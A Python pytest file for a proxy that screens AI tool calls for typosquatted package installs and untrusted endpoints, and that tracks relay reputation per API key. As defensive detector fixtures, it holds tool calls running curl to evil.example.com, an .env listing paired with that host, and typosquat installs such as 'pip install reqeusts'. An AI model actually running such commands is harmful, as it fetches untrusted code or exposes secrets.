# SPDX-License-Identifier: DaoTi-Research-1.0
# Copyright (c) 2026 独立研究者，知白

"""依赖包提取的误报防护 + 信誉键按 Key 区分 —— 契约测试。

★ 为什么单独锁住（2026-10-04）
────────────────────────────────────────────────────────────────
审计用户真实日志（799 条）时发现两类误报：

① **把代码内容当成「即将安装的包」**
   `pattern` 被判为「未声明依赖」（alert）；
   `label` 被判为「疑似 babel 的错拼」→ **block**。
   而它们只是模型写在 Edit 参数里的普通变量名。
   根因：exec_packages 用了「代码依赖声明」形态（import/require/"x":"1.0"）
   去扫 tool_call 参数，而那些描述的是「代码引用了什么」，
   不是「将要装什么」。

② **同一地址的不同账号被并成一条信誉**
   用户配了两个中转站，netloc 与 path 完全相同、只有 Key 不同；
   信誉表主键是纯主机名，于是两家的账混在一起 ——
   用户看到「一家」的分数，实际是两家之和。
"""

from __future__ import annotations

import json
import sys
import time
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent
# ★ 2026-11-13：必须无条件置顶 —— editable .pth 已把
#   该路径加入 sys.path（位置在 H:\XuanDun\src 之后），
#   只判断 `not in` 会跳过，导致 import 到根目录旧副本。
if str(REPO / "src") in sys.path:
    sys.path.remove(str(REPO / "src"))
sys.path.insert(0, str(REPO / "src"))

from daoti_xuandun_personal.proxy.baseline import (  # noqa: E402
    build_baseline,
    detect_typosquat,
    diff_against_baseline,
    extract_exec_hosts,
    extract_response_facts,
)
from daoti_xuandun_personal.reputation.tracker import (  # noqa: E402
    ReputationTracker,
)


def _facts(tool_name: str, args_text: str):
    payload = {
        "model": "m",
        "choices": [{"message": {"tool_calls": [{
            "function": {"name": tool_name, "arguments": args_text}
        }]}}],
    }
    return extract_response_facts(payload, "")


class TestEverydayWordsAreNotPackages:
    """① 日常技术词不得被判成 typosquat。"""

    @pytest.mark.parametrize("word", [
        "label", "pattern", "value", "data", "name", "type", "text",
        "code", "style", "class", "item", "key", "error", "result",
    ])
    def test_everyday_word_is_not_typosquat(self, word):
        assert detect_typosquat(word) is None, (
            f"日常词 {word!r} 被判成 typosquat —— "
            "模型在代码里写个同名变量就会拦下整段对话"
        )

    @pytest.mark.parametrize("pkg,real", [
        ("reqeusts", "requests"),
        ("lodahs", "lodash"),
        ("axois", "axios"),
    ])
    def test_real_typosquat_still_detected(self, pkg, real):
        """防止「放宽」把真实攻击一起放过。"""
        assert detect_typosquat(pkg) == real, (
            f"{pkg!r} 的 typosquat 没被检出 —— 放宽日常词时削弱了真检测"
        )


class TestCodeContentIsNotInstalledPackages:
    """② tool_call 里的代码内容不算「即将安装的包」。"""

    def test_edit_content_is_not_exec_packages(self):
        """Edit 写入含 import 的代码 —— 不是安装动作。"""
        code = (
            'json.dumps({"label": "1", "pattern": "x"})\n'
            "import pattern\n"
            "label = pattern.value\n"
        )
        f = _facts("Edit", code)
        assert "label" not in f["exec_packages"]
        assert "pattern" not in f["exec_packages"], (
            "Edit 参数里的普通词被当成即将安装的依赖 —— "
            "写代码不是装包，这会让日常编码对话不断被拦"
        )

    def test_install_command_still_extracted(self):
        f = _facts("RunCommand", "pip install requests regextest")
        assert "requests" in f["exec_packages"]
        assert "regextest" in f["exec_packages"]

    def test_multiple_packages_all_extracted(self):
        """★ `pip install a b c` 里三个包都要提取。

        单捕获组只拿第一个 —— 攻击者把 typosquat 放在第二个位置即可绕过。
        """
        f = _facts("RunCommand", "pip install requests reqeusts lodash")
        assert {"requests", "reqeusts", "lodash"} <= f["exec_packages"], (
            f"多包安装只提取到 {sorted(f['exec_packages'])} —— "
            "typosquat 放在第二个位置就漏了"
        )

    def test_plain_command_is_not_install(self):
        f = _facts("RunCommand", "python -c 'import os; print(os.getcwd())'")
        assert not f["exec_packages"], (
            "普通命令里的 import 被当成安装动作"
        )


class TestReputationKeyDistinguishesAccounts:
    """③ 同一主机不同 Key 必须分开统计。"""

    def test_same_host_different_key_differs(self):
        k1 = ReputationTracker.reputation_key("https://api.x.com/v1", "sk-aaa")
        k2 = ReputationTracker.reputation_key("https://api.x.com/v1", "sk-bbb")
        assert k1 != k2, (
            "同一主机的两个账号拿到同一个信誉键 —— 两家的账会混在一起"
        )
        assert k1.startswith("api.x.com#")
        assert k2.startswith("api.x.com#")

    def test_same_key_same_host_is_stable(self):
        """同一账号 + 同一主机 → 键稳定，不受 base_url 写法影响。

        ★ 用户填地址的习惯差异极大（带不带 /v1、带不带完整端点）。
          若把路径纳入键，同一家会因填法不同而分成两个键，
          历史信誉凭空断档。
        """
        a = ReputationTracker.reputation_key("https://api.x.com", "sk-a")
        b = ReputationTracker.reputation_key(
            "https://api.x.com/v1/chat/completions", "sk-a"
        )
        assert a == b, (
            f"同一账号因 base_url 写法不同拿到不同键：{a} vs {b}"
        )

    def test_key_never_contains_raw_api_key(self):
        """★ 键会被写进数据库、日志、CSV —— 绝不能含明文 Key。"""
        secret = "sk-proj-SUPERSECRETVALUE1234567890"
        k = ReputationTracker.reputation_key("https://api.x.com", secret)
        assert secret not in k, "信誉键里出现了明文 API Key"
        assert k.split("#", 1)[1] not in secret

    def test_display_domain_strips_fingerprint(self):
        k = ReputationTracker.reputation_key("https://api.x.com", "sk-a")
        assert ReputationTracker.display_domain(k) == "api.x.com"
        # 无指纹的旧键原样返回
        assert ReputationTracker.display_domain("api.x.com") == "api.x.com"
        assert ReputationTracker.display_domain("") == ""

    def test_empty_key_degrades_to_host(self):
        """没填 Key 时退化为纯主机，不产生孤儿键。"""
        assert ReputationTracker.reputation_key(
            "https://api.x.com", ""
        ) == "api.x.com"

    def test_tracker_counts_two_accounts_separately(self):
        """端到端：两家同地址不同 Key，各自计数。"""
        t = ReputationTracker()
        t.record_call("https://api.x.com", "pass", 100.0, "", api_key="sk-a")
        t.record_call("https://api.x.com", "pass", 100.0, "", api_key="sk-a")
        t.record_call("https://api.x.com", "block", 100.0, "",
                      categories=["tool_call_dangerous"], api_key="sk-b")

        reps = {r.domain: r for r in t.list_all()}
        assert len(reps) == 2, f"应有两家，实际 {list(reps)}"
        a = reps[ReputationTracker.reputation_key("https://api.x.com", "sk-a")]
        b = reps[ReputationTracker.reputation_key("https://api.x.com", "sk-b")]
        assert a.total_calls == 2
        assert a.relay_danger_count == 0
        assert b.total_calls == 1
        assert b.relay_danger_count == 1, (
            "B 家的风险没有记到 B 家 —— 两家混在一起了"
        )
        assert a.score == 100 and b.score < 100


class TestLegacyKeyMigration:
    """④ 旧键迁移：无歧义才迁，且日志域名要一起迁。"""

    @pytest.fixture()
    def store(self, tmp_path, monkeypatch):
        monkeypatch.setenv("XUANDUN_DATA_DIR", str(tmp_path))
        import importlib

        from daoti_xuandun_personal import paths
        importlib.reload(paths)
        from daoti_xuandun_personal.storage import db as db_mod
        importlib.reload(db_mod)
        yield db_mod.PersonalStorage(db_path=tmp_path / "m.db")
        monkeypatch.delenv("XUANDUN_DATA_DIR", raising=False)
        importlib.reload(paths)

    def test_migrates_reputation_and_logs_together(self, store):
        """★ 两张表必须一起迁。

        只迁信誉、不迁 logs，会让按日志重算时匹配不到新键 ——
        用户看到「日志有 200 条、卡片显示 0 次调用」，比不迁移更糟。
        """
        from daoti_xuandun_personal.types import (
            Action, LogEntry, LogType, RelayReputation,
        )

        store.upsert_reputation(RelayReputation(
            domain="api.x.com", total_calls=5, first_seen=time.time(),
        ))
        store.insert_log(LogEntry(
            timestamp=time.time(),
            log_type=LogType.RESPONSE_VERIFY.value,
            relay_domain="api.x.com", action=Action.PASS.value,
            severity="low", model="m", finding_count=0, summary="x",
        ))

        res = store.migrate_relay_key("api.x.com", "api.x.com#abc12345")
        assert res["reputation"] == 1
        assert res["logs"] == 1

        reps = store.load_reputations()
        assert reps[0].domain == "api.x.com#abc12345"
        assert reps[0].total_calls == 5, "迁移丢了历史计数"
        facts = store.iter_log_facts()
        assert facts[0]["domain"] == "api.x.com#abc12345", (
            "日志域名没跟着迁 —— 重算会匹配不到新键"
        )

    def test_migration_is_idempotent(self, store):
        from daoti_xuandun_personal.types import RelayReputation

        store.upsert_reputation(RelayReputation(domain="api.x.com"))
        first = store.migrate_relay_key("api.x.com", "api.x.com#abc12345")
        second = store.migrate_relay_key("api.x.com", "api.x.com#abc12345")
        assert first["reputation"] == 1
        assert second["reputation"] == 0, "重复迁移应是无操作"

    def test_does_not_overwrite_existing_target(self, store):
        """目标键已存在时保留它（新版数据更新），不覆盖。"""
        from daoti_xuandun_personal.types import RelayReputation

        store.upsert_reputation(RelayReputation(
            domain="api.x.com", total_calls=99,
        ))
        store.upsert_reputation(RelayReputation(
            domain="api.x.com#abc12345", total_calls=7,
        ))
        store.migrate_relay_key("api.x.com", "api.x.com#abc12345")
        reps = {r.domain: r for r in store.load_reputations()}
        assert reps["api.x.com#abc12345"].total_calls == 7, (
            "迁移覆盖了已存在的新键数据"
        )


class TestToolNameMustLookLikeAName:
    """⑤ 只有「像工具名」的值才算工具名。

    ★ 实测缺陷（2026-10-04）：某些模型/网关把工具调用写成文本
      （`<invoke name="Grep">`、命令行），而那段文本落进了 name 字段。
      日志里于是出现一个 200 字符、含换行与引号的「工具名」，
      被判成「响应调用了未声明的工具」并**阻断**了对话。
    """

    def _facts_of_name(self, name: str):
        payload = {"tool_calls": [{"function": {
            "name": name, "arguments": "{}",
        }}]}
        return extract_response_facts(payload, "")

    def test_command_line_text_is_not_a_tool_name(self):
        got = self._facts_of_name(
            'Get-ChildItem -Path "h:\\sjfh\\x" -Recurse -Filter "*.json" '
            "| Select-Object -First 5 FullName"
        )
        assert got["tool_names"] == [], (
            "一段命令行文本被当成了工具名 —— "
            "会触发「调用了未声明的工具」并阻断对话"
        )

    def test_multiline_xml_invoke_is_not_a_tool_name(self):
        got = self._facts_of_name(
            'Get-ChildItem</command>\n</invoke>\n<invoke name="Grep'
        )
        assert got["tool_names"] == []

    def test_real_tool_names_still_collected(self):
        assert self._facts_of_name("Edit")["tool_names"] == ["Edit"]
        assert self._facts_of_name("RunCommand")["tool_names"] == ["RunCommand"]

    @pytest.mark.parametrize("name", [
        "mcp__fs__read_file", "filesystem/read_file", "str.replace",
        "get_weather", "github.create_issue",
    ])
    def test_mcp_style_names_are_allowed(self, name):
        """MCP / 带命名空间的名字是合法的，不能被形态校验误杀。"""
        assert self._facts_of_name(name)["tool_names"] == [name]


class TestAmbiguousMigrationFallsBackToActive:
    """⑥ 同一主机多个账号时，旧记录归给当前启用项。

    ★ 修的是 v0.1.5 引入的回归：跳过不迁会让旧键与新键并存，
      而前端按新键匹配不到 —— 首页「当前中转站」显示成
      「已配置 · 尚未产生调用记录」，用户明明一直在用却看到空态。
    """

    def _run_migration(self, store, active, others):
        from daoti_xuandun_personal.proxy import app as app_mod
        from daoti_xuandun_personal.reputation.tracker import ReputationTracker

        class _Relay:
            base_url = active["base_url"]
            api_key = active["api_key"]

            def all_relays(self):
                return [dict(active, id="a")] + [
                    dict(o, id=f"o{i}") for i, o in enumerate(others)
                ]

        class _Cfg:
            relay = _Relay()

        old = (app_mod._storage, app_mod._config, app_mod._reputation)
        app_mod._storage = store
        app_mod._config = _Cfg()
        app_mod._reputation = ReputationTracker()
        try:
            app_mod._migrate_relay_keys_to_fingerprint()
        finally:
            app_mod._storage, app_mod._config, app_mod._reputation = old

    @pytest.fixture()
    def store(self, tmp_path, monkeypatch):
        monkeypatch.setenv("XUANDUN_DATA_DIR", str(tmp_path))
        import importlib

        from daoti_xuandun_personal import paths
        importlib.reload(paths)
        from daoti_xuandun_personal.storage import db as db_mod
        importlib.reload(db_mod)
        yield db_mod.PersonalStorage(db_path=tmp_path / "amb.db")
        monkeypatch.delenv("XUANDUN_DATA_DIR", raising=False)
        importlib.reload(paths)

    def test_same_host_multiple_accounts_goes_to_active(self, store):
        from daoti_xuandun_personal.reputation.tracker import ReputationTracker
        from daoti_xuandun_personal.types import RelayReputation

        store.upsert_reputation(RelayReputation(
            domain="api.x.com", total_calls=5, first_seen=time.time(),
        ))
        active = {"base_url": "https://api.x.com/v1", "api_key": "sk-active"}
        other = {"base_url": "https://api.x.com/v1", "api_key": "sk-other"}

        self._run_migration(store, active, [other])

        active_key = ReputationTracker.reputation_key(
            active["base_url"], active["api_key"]
        )
        reps = {r.domain: r for r in store.load_reputations()}
        assert active_key in reps, (
            f"旧记录没归到当前启用项：{sorted(reps)} —— "
            "首页「当前中转站」会显示「尚未产生调用记录」空态"
        )
        assert reps[active_key].total_calls == 5, "迁移丢了历史计数"

    def test_single_account_still_migrates(self, store, tmp_path):
        """无歧义时照旧直接迁移。"""
        from daoti_xuandun_personal.reputation.tracker import ReputationTracker
        from daoti_xuandun_personal.types import RelayReputation

        store.upsert_reputation(RelayReputation(domain="api.y.com"))
        active = {"base_url": "https://api.y.com/v1", "api_key": "sk-only"}
        self._run_migration(store, active, [])
        key = ReputationTracker.reputation_key(
            active["base_url"], active["api_key"]
        )
        assert [r.domain for r in store.load_reputations()] == [key]

    def test_logs_domain_migrates_so_recount_works(self, store):
        """★ 日志域名必须一起迁，否则重算时匹配不到新键、计数归零。"""
        from daoti_xuandun_personal.reputation.tracker import ReputationTracker
        from daoti_xuandun_personal.types import (
            Action, LogEntry, LogType, RelayReputation,
        )

        store.upsert_reputation(RelayReputation(domain="api.x.com"))
        store.insert_log(LogEntry(
            timestamp=time.time(),
            log_type=LogType.RESPONSE_VERIFY.value,
            relay_domain="api.x.com", action=Action.PASS.value,
            severity="low", model="m", finding_count=0, summary="x",
        ))
        active = {"base_url": "https://api.x.com/v1", "api_key": "sk-a"}
        self._run_migration(store, active, [])
        key = ReputationTracker.reputation_key(
            active["base_url"], active["api_key"]
        )
        assert store.iter_log_facts()[0]["domain"] == key


class TestStdlibIsNotTyposquat:
    """Python 标准库模块不是 PyPI 包。

    ★ 2026-11-26 生产日志复核：`import urllib.request` 出现在工具参数里，
      `urllib` 与基准表里的 `urllib3` 只差一个字符，被判成错拼包并阻断。
    """

    @pytest.mark.parametrize("mod", [
        "urllib", "asyncio", "ensurepip", "zipfile", "pathlib",
    ])
    def test_stdlib_module_is_not_typosquat(self, mod):
        assert detect_typosquat(mod) is None, (
            f"标准库 {mod!r} 被判成 typosquat —— 正常代码引用会被阻断"
        )

    def test_real_typosquat_still_detected(self):
        """不能因为放过标准库，把真实攻击的错拼一起放过。"""
        assert detect_typosquat("numpfy") == "numpy"


class TestInstallCommandExtractionBoundaries:
    """`pip install` 后面同一行的注释、选项、版本号、路径不是包名。

    ★ 2026-11-26 生产日志复核：new_dependency 把
      `already`、`satisfied`、`disable-pip-version-check`、
      `0.1.99`、`11/11`、`bin/oxlint`、`win_amd64.whl` 当成了依赖包。
    """

    def test_comment_tail_is_not_packages(self):
        f = _facts("RunCommand", "pip install ruff  # already satisfied")
        assert f["exec_packages"] == {"ruff"}

    def test_long_flag_is_not_package(self):
        f = _facts("RunCommand", "pip install --disable-pip-version-check ruff")
        assert "disable-pip-version-check" not in f["exec_packages"]
        assert "ruff" in f["exec_packages"]

    def test_requirements_file_is_not_package(self):
        f = _facts("RunCommand", "pip install -r requirements.txt")
        assert not f["exec_packages"], (
            f"requirements.txt 被当成包名：{sorted(f['exec_packages'])}"
        )

    def test_versions_and_ratios_are_not_packages(self):
        f = _facts("RunCommand", "npm install oxlint 21/21 56/56 3.12.0")
        assert f["exec_packages"] == {"oxlint"}

    def test_vcs_url_is_not_packages(self):
        """`git+https://...` 的协议/VCS 片段不是包名。"""
        f = _facts("RunCommand", "pip install git+https://github.com/x/y.git")
        assert "git" not in f["exec_packages"]
        assert "https" not in f["exec_packages"]

    def test_index_url_is_not_package(self):
        """`-i https://mirror.../simple` 的地址不是包名。"""
        f = _facts(
            "RunCommand",
            "pip install -i https://mirror.example.com/simple requests",
        )
        assert "https" not in f["exec_packages"]
        assert "requests" in f["exec_packages"]

    def test_digit_leading_real_package_is_kept(self):
        """`2captcha-python` 是真实包名，不能因为以数字开头就被丢掉。"""
        f = _facts("RunCommand", "pip install 2captcha-python")
        assert "2captcha-python" in f["exec_packages"]

    def test_extras_are_not_package(self):
        """`requests[security]` 的 extras 不是独立包名。"""
        f = _facts("RunCommand", "pip install 'requests[security]>=2.0'")
        assert "security" not in f["exec_packages"]
        assert "requests" in f["exec_packages"]

    def test_vcs_fragments_do_not_trigger_new_dependency(self):
        b = build_baseline({
            "model": "m",
            "messages": [{"role": "user", "content": "从 git 源装个包"}],
        })
        facts = _facts("RunCommand", "pip install git+https://github.com/x/y.git")
        findings = diff_against_baseline(b, facts, "")
        assert not any(
            f["category"] == "new_dependency" for f in findings
        ), "VCS/协议片段被当成了新增依赖"

    def test_stdlib_install_is_not_new_dependency(self):
        b = build_baseline({
            "model": "m",
            "messages": [{"role": "user", "content": "跑个脚本"}],
        })
        facts = _facts("RunCommand", "pip install urllib")
        findings = diff_against_baseline(b, facts, "")
        assert not any(
            f["category"] in ("new_dependency", "typosquat_package")
            for f in findings
        ), "标准库被当成了新增依赖或错拼包"

    def test_real_typosquat_still_detected_end_to_end(self):
        """放宽提取边界后，真实投毒仍必须命中。"""
        b = build_baseline({
            "model": "m",
            "messages": [{"role": "user", "content": "装个包"}],
        })
        facts = _facts("RunCommand", "pip install reqeusts")
        assert "reqeusts" in facts["exec_packages"]
        findings = diff_against_baseline(b, facts, "")
        assert any(
            f["category"] == "typosquat_package" for f in findings
        ), "reqeusts 没被检出 —— 放宽提取边界削弱了真检测"


class TestToolArgumentsDecodedBeforeFacts:
    """所有检测器都吃解码后的命令文本，description 不参与执行面。

    ★ 2026-11-26：`extract_response_facts` / `extract_exec_hosts` 此前
      直接吃 JSON 原文，`description` 里的网址和安装示例会被当成
      「即将执行的端点 / 依赖」。统一解码后只取 command 字段。
    """

    @staticmethod
    def _payload(tool_name: str, args: dict) -> dict:
        return {"choices": [{"message": {"tool_calls": [{
            "function": {
                "name": tool_name,
                "arguments": json.dumps(args, ensure_ascii=False),
            },
        }]}}]}

    def test_description_url_is_not_exec_endpoint(self):
        payload = self._payload("Shell", {
            "command": "curl https://evil.example.com/x",
            "description": "参考 https://benign.example.com 文档",
        })
        facts = extract_response_facts(payload, "")
        assert "evil.example.com" in facts["exec_domains"]
        assert "benign.example.com" not in facts["exec_domains"], (
            "description 里的网址被当成了即将执行的端点"
        )

    def test_command_and_url_fields_are_both_exec_surface(self):
        """一个良性 command 不能掩盖同调用里的 url 字段。"""
        payload = self._payload("Shell", {
            "command": "Get-ChildItem *.env",
            "url": "https://evil.example.com/x",
            "description": "参考 https://benign.example.com",
        })
        facts = extract_response_facts(payload, "")
        assert "evil.example.com" in facts["exec_domains"]
        assert "benign.example.com" not in facts["exec_domains"]

    def test_gemini_args_are_decoded(self):
        """Gemini functionCall.args 也必须走统一解码。"""
        payload = {"functionCall": {"name": "Shell", "args": {
            "command": "curl https://evil.example.com/x",
            "description": "参考 https://benign.example.com",
        }}}
        facts = extract_response_facts(payload, "")
        assert "evil.example.com" in facts["exec_domains"]
        assert "benign.example.com" not in facts["exec_domains"]

    def test_extract_exec_hosts_uses_command_only(self):
        payload = self._payload("Shell", {
            "command": "curl https://evil.example.com/x",
            "description": "参考 https://benign.example.com 文档",
        })
        hosts = extract_exec_hosts(payload)
        assert "evil.example.com" in hosts
        assert "benign.example.com" not in hosts, (
            "description 里的网址进了端点台账"
        )

    def test_description_install_is_not_package(self):
        payload = self._payload("RunCommand", {
            "command": "pip install ruff",
            "description": "顺便说明：pip install reqeusts 是错拼示例",
        })
        facts = extract_response_facts(payload, "")
        assert "ruff" in facts["exec_packages"]
        assert "reqeusts" not in facts["exec_packages"], (
            "description 里的安装示例被当成了即将安装的包"
        )
